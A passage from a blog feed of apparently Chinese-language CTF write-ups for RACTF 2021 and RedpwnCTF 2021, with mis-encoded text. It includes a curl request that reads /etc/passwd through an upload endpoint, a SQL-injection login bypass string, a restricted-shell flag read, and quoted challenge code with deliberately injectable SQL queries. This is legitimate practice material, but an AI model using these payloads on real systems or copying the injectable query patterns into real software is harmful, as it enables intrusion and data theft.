&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">next_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">update_secret&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">next_char&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[+] Curr Flag:&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ractf{data_exf1l_via_s0rt1ng_0c66de47}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://github.com/glikogataki/RACTF-Some-Challs/tree/main/secret_store">wp1&lt;/a> &lt;a href="https://medium.com/@Nicholaz99/ractf-2021-writeup-647554511dc5">wp2&lt;/a>&lt;/p>
&lt;h2 id="webim-a-fun">Web/I&amp;rsquo;m a fun&lt;/h2>
&lt;blockquote>
&lt;p>Agent,&lt;/p>
&lt;p>Do you remember the firearms store case from last year? The one they were using as a secret communication platform?&lt;/p>
&lt;p>Well, we&amp;rsquo;ve located the servers for them, the issue is they&amp;rsquo;re based abroad in a country where we do not have any jurisdiction. Thus, we&amp;rsquo;ll need to gain shell access to their systems the good old way. They&amp;rsquo;re hosting another webapp again, this time it seems like some early version of a social media network that they&amp;rsquo;re working on. This is good for us as it means there will almost certainly be some vulnerabilities present.&lt;/p>
&lt;p>We&amp;rsquo;ve linked the webapp for you, can you take a look and see if you can gain access to their server?&lt;/p>
&lt;/blockquote>
&lt;p>åœ¨/upload/contentå¤„å¯ä»¥ä¸Šä¼ videoï¼Œç‰¹åˆ«çš„æ˜¯ä¸Šä¼ å¤„æœ‰ä¸ª&lt;code>external&lt;/code>&lt;/p>
&lt;p>ç”¨curlæ–¹å¼è¯·æ±‚ä¸€ä¸‹/etc/passwdï¼Œ&lt;code>curl -X POST http://193.57.159.27:26635/upload/content -F file=/etc/passwd -F source=internal&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818163712187.png" alt="image-20210818163712187">&lt;/p>
&lt;p>ä¹‹åŽå°è¯•è¯»æºç ï¼ˆæˆ‘æ²¡çˆ†å‡ºæ¥ç›®å½•ï¼‰ï¼Œä¹‹åŽçš„çœ‹wpäº†ï¼Œæˆ‘å¤ªèœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818170117432.png" alt="image-20210818170117432">&lt;/p>
&lt;p>&lt;code>ractf{l4ws_0f_phys1cs_c4n_tak3_a_h1ke}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://github.com/TheBadGod/ractf2021/blob/main/im_a_fan.md">wp&lt;/a>&lt;/p>
&lt;h2 id="osinttriangles">OSINT/Triangles&lt;/h2>
&lt;p>&lt;a href="https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW">https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815120938702.png" alt="image-20210815120938702">&lt;/p>
&lt;h2 id="miscellaneousdiscord">Miscellaneous/Discord&lt;/h2>
&lt;blockquote>
&lt;p>Come join our &lt;a href="https://discord.gg/Rrhdvzn">Discord&lt;/a>!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>ractf{so_here_we_are_again}&lt;/code>&lt;/p>
&lt;h2 id="miscellaneousmissing-tools">Miscellaneous/Missing Tools&lt;/h2>
&lt;blockquote>
&lt;p>Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?&lt;/p>
&lt;p>Username: &lt;code>ractf&lt;/code>&lt;/p>
&lt;p>Password: &lt;code>8POlNixzDSThy&lt;/code>&lt;/p>
&lt;p>Note: it may take a minute or more for your container to start depending on load&lt;/p>
&lt;/blockquote>
&lt;p>æ ¹æ®ç»™å‡ºçš„ä¿¡æ¯sshè¿žå…¥ä¸€ä¸ªç»ˆç«¯ï¼Œå¯ä»¥å‘çŽ°å¾ˆå¤šçš„å‘½ä»¤éƒ½è¢«ç¦æ­¢äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025059013.png" alt="image-20210818025059013">&lt;/p>
&lt;p>ä½¿ç”¨&lt;code>echo /usr/bin/* /bin/*&lt;/code>å¯ä»¥æŸ¥çœ‹èƒ½ä½¿ç”¨çš„å‘½ä»¤è¿˜æœ‰å“ªäº›&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025158619.png" alt="image-20210818025158619">&lt;/p>
&lt;p>â€”â€”â€”â€”å…ˆè¯´ä¸€ä¸‹ç®€å•çš„éžé¢„æœŸè§£ï¼š&lt;code>echo *&lt;/code>æ‰¾åˆ°flag.txtï¼Œç„¶åŽ&lt;code>source flag.txt&lt;/code>æˆ–è€…&lt;code>sh &amp;lt; flag.txt&lt;/code>éƒ½èƒ½è¯»å‡ºæ¥&lt;/p>
&lt;p>è€Œé¢„æœŸè§£ä½¿ç”¨çš„æ˜¯&lt;u>split+re-sha256&lt;/u>çš„æ–¹å¼ã€‚ç›´æŽ¥ç”¨sha256sumå¾—åˆ°flagç„¶åŽæƒ³å¼ºè¡Œæš´åŠ›ç ´è§£æ˜¾ç„¶éžå¸¸çš„ä¸çŽ°å®žï¼Œä½†æ˜¯splitè¿™ä¸ªå·¥å…·å¯ä»¥ä»¥å›ºå®šçš„å­—èŠ‚æ•°æ¥åˆ’åˆ†ç»™å®šçš„æ–‡ä»¶ï¼Œå¦‚æžœæˆ‘ä»¬ä»¥å¾ˆå°çš„æ ‡å°ºæ¥åˆ’åˆ†flagå¹¶è¿›è¡Œsha256ï¼Œé‚£ä¹ˆè¿™æ ·å¾—åˆ°çš„hashå€¼å°±å°†éžå¸¸æœ‰å¯èƒ½çˆ†ç ´å‡ºæ¥ï¼Œæœ€åŽå†æŠŠå®ƒä»¬åˆèµ·æ¥å°±èƒ½å¾—åˆ°æœ€ç»ˆçš„flagäº†ï¼ˆè¿™é‡Œç”¨3bytesåˆ’åˆ†ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -b &lt;span style="color:#ae81ff">3&lt;/span> flag.txt
$ &lt;span style="color:#111">echo&lt;/span> *
flag.txt xaa xab xac xad xae xaf xag xah xai xaj xak xal
$ sha256sum xa*
df10b4bd068175bd33f200e48e721a019091c67c06c26ae273da5aaf51424618 xaa
582c3f2f5c5c630d0ee458d5d7c859e7ed36d6fb5862a761e110562438bd4272 xab
a7f5397443359ea76c50be82c77f1f893a060925b51a332cc5da906f83d3344e xac
569a659ae7633e5ddd7f523b283c1169dad3eb99a3da4b3ad2d5619d9236dc12 xad
7096489b19f4ab1b6c9e1502367c18d5e3adcfeb21b0a0282041ca99e798a14d xae
618630d1fed7f03ed43dfb03eeae681c1812177c43d3afe1cbe32bb3fee12bf9 xaf
f2f9ca19dad6782e5e92edd758439f11067ae23ab0d418a56f406de6c9bb151a xag
f481b98f744da847f44f5e67996010859061dca4945e87396016a1ef4ac38460 xah
de7bc3aee118c9689e2cba40c4c427ab8986b8a37c9c4f837e019559de9faffd xai
a14d511b5d8b444da7ea5ab52feb71271a46bb8374ab24f5251701b23bef4276 xaj
56fb98daea7879c3e2218eb960b9150c2d7978686af5f7f43f80641a6f62b22a xak
df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030044169.png" alt="image-20210818030044169">&lt;/p>
&lt;p>åˆ°&lt;a href="https://crackstation.net/">CrackStation&lt;/a>ä¸€æŠŠæ¢­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030225147.png" alt="image-20210818030225147">&lt;/p>
&lt;p>&lt;code>ractf{std0ut_1s_0v3rr4ted_spl1t_sha}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>å®³ï¼Œå‰å‡ å¤©çŠ¶æ€èŽ«åå¾ˆå·®ï¼Œä¹‹å‰æŠ¥çš„å‡ ä¸ªå‘¨æœ«çš„ctfç”šè‡³è¿žç­¾åˆ°éƒ½æ²¡ç­¾ï¼Œå¤çŽ°ä¹Ÿæ˜¯ä¸€æ‹–å†æ‹–ï¼Œæ‹–åˆ°çŽ¯å¢ƒéƒ½å…³å®Œäº†ï¼ŒæŒºåŽæ‚”çš„ï¼Œæ˜¯è‡ªå·±çš„é—®é¢˜ã€‚&lt;/p>
&lt;p>åœ¨åæ€å’Œè°ƒæ•´äº†ï¼Œå—¯ã€‚&lt;/p></description></item><item><title>RedpwnCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/</link><pubDate>Sun, 08 Aug 2021 20:08:39 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/</guid><description>&lt;p>å®˜æ–¹çš„dockeråœ°å€~~å¤çŽ°ä¸€æœ¬æ»¡è¶³~&lt;a href="https://github.com/redpwn/redpwnctf-2021-challenges">https://github.com/redpwn/redpwnctf-2021-challenges&lt;/a>&lt;/p>
&lt;h2 id="webinspect-me">web/inspect-me&lt;/h2>
&lt;blockquote>
&lt;p>See if you can find the flag in the source code!&lt;/p>
&lt;p>&lt;a href="https://inspect-me.mc.ax/">inspect-me.mc.ax&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092212510.png" alt="image-20210710092212510">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092254315.png" alt="image-20210710092254315">&lt;/p>
&lt;h2 id="weborm-bad">web/orm-bad&lt;/h2>
&lt;blockquote>
&lt;p>I just learned about orms today! They seem kinda difficult to implement though&amp;hellip; Guess I&amp;rsquo;ll stick to good old raw sql statements!&lt;/p>
&lt;p>&lt;a href="https://orm-bad.mc.ax/">orm-bad.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/eb4c66c15fe3013340068ef0a34bd5dd5c0c98c567fac53b158d56afe07b511c/app.js">app.js&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ä¸‡èƒ½å¯†ç ï¼šadmin&amp;rsquo;or'1 : admin&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092643161.png" alt="image-20210710092643161">&lt;/p>
&lt;p>å…³äºŽorm ä¹‹åŽè¦è¡¥ä¸€ä¸‹çŸ¥è¯†ï¼š&lt;a href="https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping">Objectâ€“relational mapping&lt;/a> &lt;a href="http://www.ruanyifeng.com/blog/2019/02/orm-tutorial.html">ORM å®žä¾‹æ•™ç¨‹&lt;/a>&lt;/p>
&lt;h2 id="websecure">web/secure&lt;/h2>
&lt;blockquote>
&lt;p>Just learned about encryptionâ€”now, my website is unhackable!&lt;/p>
&lt;p>&lt;a href="https://secure.mc.ax/">secure.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/210a9fe526e420576e4b6c1cb74eeed437c1a89955c8158c14aa365c45578200/index.js">index.js&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>è¿˜æ˜¯ä¸ªç™»å½•æ¡†ï¼Œå°è¯•ä¸‡èƒ½å¯†ç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094442324.png" alt="image-20210710094442324">&lt;/p>
&lt;p>æºç æ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;crypto&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;better-sqlite3&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;db.sqlite3&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`DROP TABLE IF EXISTS users;`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`CREATE TABLE users(
&lt;/span>&lt;span style="color:#d88200"> id INTEGER PRIMARY KEY AUTOINCREMENT,
&lt;/span>&lt;span style="color:#d88200"> username TEXT,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200">);`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`INSERT INTO users (username, password) VALUES (
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;,
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">randomUUID&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">)`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;body-parser&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/?message=Username and password required!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT id FROM users WHERE
&lt;/span>&lt;span style="color:#d88200"> username = &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39; AND
&lt;/span>&lt;span style="color:#d88200"> password = &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;;`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">prepare&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`/?message=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">FLAG&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Incorrect login&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">`/?message=Incorrect username or password. Query: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»–è¿™ä¸ªb64åŠ å¯†æ˜¯å‘ç”Ÿåœ¨å‰ç«¯çš„ï¼Œä¹Ÿå°±æ˜¯åœ¨å‘åŒ…çš„æ—¶å€™å°±å·²ç»å¯¹postçš„æ•°æ®è¿›è¡Œäº†é¢„å¤„ç†ï¼Œè€Œå…·ä½“åˆ°åŽç«¯è¿›è¡Œsqlè¯­å¥çš„æŸ¥è¯¢æ—¶ä¼šç›´æŽ¥æ‹¼æŽ¥req.body.username/passwdçš„æ•°æ®ï¼Œä¸ä¼šè¿›è¡Œè¿›ä¸€æ­¥çš„æ£€æŸ¥æˆ–è¿‡æ»¤&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104923251.png" alt="image-20210710104923251">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104859539.png" alt="image-20210710104859539">&lt;/p>
&lt;p>åˆšå¼€å§‹æƒ³å¤æ‚äº†&lt;/p>
&lt;h2 id="webcool">web/cool&lt;/h2>
&lt;blockquote>
&lt;p>Aaron has a message for the cool kids. For support, DM BrownieInMotion.&lt;/p>
&lt;p>&lt;a href="https://cool.mc.ax/">cool.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/e03916d52bb7e84cbd2f9f26e5de162fdd0442c40d8397a103aab5813031fd83/app.py">app.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ç™»å½•æ¡†ï¼Œå¯ä»¥æ³¨å†Œ å…ˆå°è¯•test: test ç™»å½•æˆåŠŸä½†æ˜¯æ— æ³•èŽ·å–ä¿¡æ¯ï¼ˆæ³¨å†ŒåŽä¹Ÿä¼šè·³è½¬è¿™ä¸ªé¡µé¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105453861.png" alt="image-20210710105453861">&lt;/p>
&lt;p>ç•™æ„cookieéƒ¨åˆ†ï¼Œæ˜¯ç†Ÿæ‚‰çš„flask sessionï¼Œæ‰”è¿›å·¥å…·é‡Œè§£å¯†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105534823.png" alt="image-20210710105534823">&lt;/p>
&lt;p>å†å‚è€ƒæºç ä¸­çš„/messageéƒ¨åˆ†ï¼Œè€ƒè™‘å°†sessionè®¾ä¸º{&amp;ldquo;username&amp;rdquo;:&amp;ldquo;ginkoid&amp;rdquo;}åŽç™»å…¥æŸ¥çœ‹ä¿¡æ¯ï¼ˆå¼€å§‹ä»¥ä¸ºæ˜¯sessionä¼ªé€  åŽæ¥å‘çŽ°ä¸æ˜¯ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710113131546.png" alt="image-20210710113131546">&lt;/p>
&lt;p>çœ‹ä¸€ä¸‹å…¶ä»–éƒ¨åˆ†çš„æºç ï¼Œé¦–å…ˆæ˜¯init()&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#75715e"># this is terrible but who cares&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> CREATE TABLE IF NOT EXISTS users (
&lt;/span>&lt;span style="color:#d88200"> username TEXT PRIMARY KEY,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200"> );
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;DROP TABLE users;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> CREATE TABLE users (
&lt;/span>&lt;span style="color:#d88200"> username TEXT PRIMARY KEY,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200"> );
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># put ginkoid into db&lt;/span>
&lt;span style="color:#111">ginkoid_password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">generate_token&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;INSERT OR IGNORE INTO users (username, password)&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">ginkoid&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">ginkoid_password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;UPDATE users SET password=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">ginkoid_password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;WHERE username=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">ginkoid&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">;&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
